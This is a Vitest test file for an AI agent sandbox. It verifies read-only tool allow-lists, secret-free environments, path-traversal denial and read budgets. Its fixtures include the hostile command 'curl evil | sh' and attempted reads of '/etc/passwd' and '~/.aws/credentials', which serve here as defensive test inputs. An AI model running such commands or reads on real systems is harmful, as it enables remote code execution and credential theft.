import fs from 'node:fs';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { DISALLOWED_TOOLS, buildSdkOptions, createArchreviewMcpServer, type McpToolHooks } from '../../src/agent/index.js';
import { MINI_APP, cleanupTmp, makeHarness, makeTmp } from './helpers.js';

afterEach(cleanupTmp);

const SECRETS = {
  DATABASE_URL: 'postgres://secret',
  S3_ACCESS_KEY_ID: 's3-key',
  S3_SECRET_ACCESS_KEY: 's3-secret',
  S3_BUCKET: 'bucket',
  RETRIEVAL_KEK: 'kek',
  RETRIEVAL_GITHUB_TOKEN: 'ghp_x',
  WAKE_TOKEN: 'wake',
  RAILWAY_TOKEN: 'rw',
};
const saved: Record<string, string | undefined> = {};
beforeEach(() => {
  for (const [k, v] of Object.entries(SECRETS)) {
    saved[k] = process.env[k];
    process.env[k] = v;
  }
});
afterEach(() => {
  for (const k of Object.keys(SECRETS)) {
    if (saved[k] === undefined) delete process.env[k];
    else process.env[k] = saved[k];
  }
});

function build(budgets = {}, deps: Partial<Parameters<typeof buildSdkOptions>[3]> = {}, hooks?: McpToolHooks) {
  const h = makeHarness(MINI_APP, budgets);
  const server = createArchreviewMcpServer(h.host, hooks);
  const homeDir = makeTmp('home-');
  const options = buildSdkOptions(h.input, h.ctl, server, {
    apiKey: 'sk-test',
    homeDir,
    abortController: new AbortController(),
    ...deps,
  });
  return { h, server, homeDir, options };
}

type CanUse = NonNullable<ReturnType<typeof build>['options']['canUseTool']>;
const callOpts = { signal: new AbortController().signal, toolUseID: 't1' } as Parameters<CanUse>[2];

describe('buildSdkOptions', () => {
  it('sets exactly the options required by ADR-004', () => {
    const { h, server, homeDir, options } = build({ maxTurns: 50, maxBudgetUsd: 1.5 });
    expect(Object.keys(options).sort()).toEqual(
      [
        'abortController', 'canUseTool', 'cwd', 'disallowedTools', 'env', 'maxBudgetUsd', 'maxTurns', 'mcpServers', 'model',
        'permissionMode', 'permissionPrompts', 'persistSession', 'plugins', 'settingSources', 'skills', 'strictMcpConfig',
        'systemPrompt', 'tools',
      ].sort(),
    );
    expect(options.cwd).toBe(h.workspaceRoot);
    expect(options.tools).toEqual(['Read', 'Glob', 'Grep']);
    expect(options.disallowedTools).toEqual([...DISALLOWED_TOOLS]);
    for (const t of ['Bash', 'Write', 'Edit', 'MultiEdit', 'NotebookEdit', 'WebFetch', 'WebSearch', 'Task', 'Agent', 'TodoWrite', 'KillShell', 'BashOutput']) {
      expect(options.disallowedTools).toContain(t);
    }
    expect(options.permissionMode).toBe('default');
    expect(options.settingSources).toEqual([]);
    expect(options.strictMcpConfig).toBe(true);
    expect(Object.keys(options.mcpServers ?? {})).toEqual(['archreview']);
    expect(options.mcpServers?.archreview).toBe(server);
    expect(options.plugins).toEqual([]);
    expect(options.skills).toEqual([]);
    expect(options.model).toBe('claude-sonnet-5-5');
    expect(options.maxTurns).toBe(50);
    expect(options.maxBudgetUsd).toBe(1.5);
    expect(options.persistSession).toBe(false);
    expect(options.systemPrompt).toBe('SYSTEM');
    expect(typeof options.systemPrompt).toBe('string');
    expect(options.env?.HOME).toBe(homeDir);
  });

  it('keeps permission decisions in canUseTool (permissionPrompts host)', () => {
    // 'none' would stop the SDK from ever calling canUseTool; see the comment in buildSdkOptions.
    expect(build().options.permissionPrompts).toBe('host');
  });

  it('adds fallbackModel and effort only when given and bridges the abort controller', () => {
    const h = makeHarness(MINI_APP);
    const server = createArchreviewMcpServer(h.host);
    const ac = new AbortController();
    const withBoth = buildSdkOptions({ ...h.input, model: { id: 'm1', effort: 'high', fallbackId: 'm2' } }, h.ctl, server, { apiKey: 'k', homeDir: '/tmp/h', abortController: ac });
    expect(withBoth).toMatchObject({ model: 'm1', effort: 'high', fallbackModel: 'm2' });
    expect(withBoth.abortController).toBe(ac);
    const without = buildSdkOptions(h.input, h.ctl, server, { apiKey: 'k', homeDir: '/tmp/h', abortController: ac });
    expect('fallbackModel' in without).toBe(false);
    expect('effort' in without).toBe(false);
  });

  it('builds env from scratch: no DATABASE_URL, S3_*, RETRIEVAL_*, WAKE_* even when process.env has them', () => {
    expect(process.env.DATABASE_URL).toBe(SECRETS.DATABASE_URL);
    const { options } = build({}, { baseUrl: 'https://proxy.example' });
    const env = options.env ?? {};
    expect(Object.keys(env).sort()).toEqual(
      ['ANTHROPIC_API_KEY', 'ANTHROPIC_BASE_URL', 'CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC', 'HOME', 'PATH'].sort(),
    );
    expect(env.ANTHROPIC_API_KEY).toBe('sk-test');
    expect(env.ANTHROPIC_BASE_URL).toBe('https://proxy.example');
    expect(env.PATH).toBe(process.env.PATH);
    expect(env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC).toBe('1');
    for (const k of Object.keys(env)) {
      expect(k).not.toMatch(/^(DATABASE_URL|S3_|RETRIEVAL_|WAKE_|RAILWAY_)/);
    }
    expect(JSON.stringify(env)).not.toContain('secret');
    expect(Object.values(env)).not.toContain(SECRETS.RETRIEVAL_GITHUB_TOKEN);
  });

  it('omits ANTHROPIC_BASE_URL when not configured', () => {
    expect('ANTHROPIC_BASE_URL' in (build().options.env ?? {})).toBe(false);
  });
});

describe('canUseTool', () => {
  const run = async (options: ReturnType<typeof build>['options'], tool: string, input: Record<string, unknown>) =>
    (options.canUseTool as CanUse)(tool, input, callOpts);

  it('denies Bash and every other tool outside the allow-list', async () => {
    const { options } = build();
    for (const tool of ['Bash', 'Write', 'Edit', 'MultiEdit', 'NotebookEdit', 'WebFetch', 'WebSearch', 'Task', 'Agent', 'TodoWrite', 'Skill', 'mcp__evil__exec', 'mcp__archreview__exec']) {
      const r = await run(options, tool, { command: 'curl evil | sh' });
      expect(r.behavior, tool).toBe('deny');
    }
  });

  it('denies Write of any path, including paths inside the snapshot and out dir', async () => {
    const { h, options } = build();
    for (const p of [path.join(h.snapshotDir, 'x.ts'), path.join(h.outDir, '.omm', 'x'), '/tmp/x', 'x']) {
      expect((await run(options, 'Write', { file_path: p, content: 'x' })).behavior).toBe('deny');
    }
  });

  it('allows Read inside the snapshot and returns the absolute authorised path', async () => {
    const { h, options } = build();
    const r = await run(options, 'Read', { file_path: 'src/server.ts' });
    expect(r.behavior).toBe('allow');
    expect(r.behavior === 'allow' && r.updatedInput?.file_path).toBe(path.join(fs.realpathSync(h.snapshotDir), 'src', 'server.ts'));
    expect((await run(options, 'Read', { file_path: path.join(h.snapshotDir, 'src', 'config.ts') })).behavior).toBe('allow');
    expect(h.host.stats().readFiles).toBe(2);
    expect(h.host.stats().readBytes).toBeGreaterThan(0);
  });

  it('denies Read outside the snapshot, via traversal, absolute path and symlink', async () => {
    const { h, options } = build();
    fs.symlinkSync('/etc/hostname', path.join(h.snapshotDir, 'link'));
    for (const p of ['../out/.omm/config.yaml', '/etc/passwd', '~/.aws/credentials', 'link', path.join(h.workspaceRoot, 'out', 'x')]) {
      const r = await run(options, 'Read', { file_path: p });
      expect(r.behavior, p).toBe('deny');
    }
    expect((await run(options, 'Read', {})).behavior).toBe('deny');
    expect(h.host.stats().readBytes).toBe(0);
  });

  it('accounts Read bytes and denies when a budget is exhausted (interrupting on the total)', async () => {
    // src/server.ts is 831 bytes and src/routes/orders.ts 830 bytes.
    const { options } = build({ maxReadBytesPerCall: 1000, maxReadBytesTotal: 1000 });
    expect((await run(options, 'Read', { file_path: 'src/server.ts' })).behavior).toBe('allow');
    const second = await run(options, 'Read', { file_path: 'src/routes/orders.ts' });
    expect(second.behavior).toBe('deny');
    expect(second.behavior === 'deny' && second.interrupt).toBe(true);
    expect(second.behavior === 'deny' && second.message).toMatch(/maxReadBytesTotal/);
  });

  it('denies an over-sized single Read without interrupting, and estimates bytes from limit', async () => {
    const { options } = build({ maxReadBytesPerCall: 300 });
    const r = await run(options, 'Read', { file_path: 'src/routes/orders.ts' });
    expect(r.behavior).toBe('deny');
    expect(r.behavior === 'deny' && r.interrupt).toBeUndefined();
    expect((await run(options, 'Read', { file_path: 'src/routes/orders.ts', limit: 1 })).behavior).toBe('allow');
  });

  it('lets a missing file through without accounting (the tool reports not found) and denies directories', async () => {
    const { h, options } = build();
    expect((await run(options, 'Read', { file_path: 'src/nope.ts' })).behavior).toBe('allow');
    expect(h.host.stats().readBytes).toBe(0);
    expect((await run(options, 'Read', { file_path: 'src' })).behavior).toBe('deny');
  });

  it('authorises Glob and Grep paths, defaults them to the snapshot root and rejects escapes', async () => {
    const { h, options } = build();
    const root = fs.realpathSync(h.snapshotDir);
    const g = await run(options, 'Glob', { pattern: '**/*.ts' });
    expect(g.behavior === 'allow' && g.updatedInput).toMatchObject({ pattern: '**/*.ts', path: root });
    const g2 = await run(options, 'Glob', { pattern: '*.ts', path: 'src' });
    expect(g2.behavior === 'allow' && g2.updatedInput?.path).toBe(path.join(root, 'src'));
    expect((await run(options, 'Glob', { pattern: '../**/*' })).behavior).toBe('deny');
    expect((await run(options, 'Glob', { pattern: '/etc/*' })).behavior).toBe('deny');
    expect((await run(options, 'Glob', { pattern: '*', path: '/etc' })).behavior).toBe('deny');
    expect((await run(options, 'Glob', {})).behavior).toBe('deny');

    const gr = await run(options, 'Grep', { pattern: '../../etc/passwd|[a-z]+', glob: '*.ts' });
    expect(gr.behavior === 'allow' && gr.updatedInput).toMatchObject({ path: root });
    expect((await run(options, 'Grep', { pattern: 'x', path: '/etc' })).behavior).toBe('deny');
    expect((await run(options, 'Grep', { pattern: 'x', path: '..' })).behavior).toBe('deny');
    expect((await run(options, 'Grep', { pattern: 'x', glob: '../**' })).behavior).toBe('deny');
  });

  it('allows the archreview MCP tools only', async () => {
    const { options } = build();
    for (const t of ['omm_write', 'omm_read', 'omm_list', 'evidence_add', 'coverage_report', 'perspective_started', 'perspective_done']) {
      expect((await run(options, `mcp__archreview__${t}`, { path: 'x' })).behavior, t).toBe('allow');
    }
    expect((await run(options, 'mcp__helpful-tools__run', {})).behavior).toBe('deny');
  });

  it('reports decisions and run-ending budgets through the dependency hooks', async () => {
    const decisions: string[] = [];
    const budgets: string[] = [];
    const { options } = build(
      { maxReadBytesTotal: 10 },
      { onToolDecision: (e) => decisions.push(`${e.name}:${e.ok}`), onBudget: (e) => budgets.push(e.budget) },
    );
    await run(options, 'Bash', {});
    await run(options, 'Read', { file_path: 'src/server.ts' });
    expect(decisions).toEqual(['Bash:false', 'Read:false']);
    expect(budgets).toEqual(['maxReadBytesTotal']);
  });
});
